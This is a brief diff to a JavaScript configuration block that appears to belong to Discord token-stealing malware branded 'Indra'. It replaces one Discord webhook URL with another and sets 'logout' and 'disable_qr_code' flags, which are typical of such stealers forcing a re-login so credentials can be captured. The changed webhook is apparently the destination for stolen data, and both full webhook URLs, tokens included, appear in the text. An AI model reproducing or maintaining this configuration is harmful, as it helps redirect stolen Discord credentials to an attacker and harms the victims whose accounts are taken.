@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "Indra",
 
-    webhook: "https://discord.com/api/webhooks/1074648884778901564/qWJLDiUxt8BiaJ3lfgkjovozOPzh1bxJGTvLtVOWgPbprPywu5H3VTsppdGjfP847lit",
+    webhook: "https://discord.com/api/webhooks/1074649954666156094/iA0qpipKeaxfi1dX1RxzOvE_8zzBI02F4gO0e8Q2AgN3bCXq1NP7adLn0joOKZPE_Cvn",
 
     logout: true,
     disable_qr_code: true,
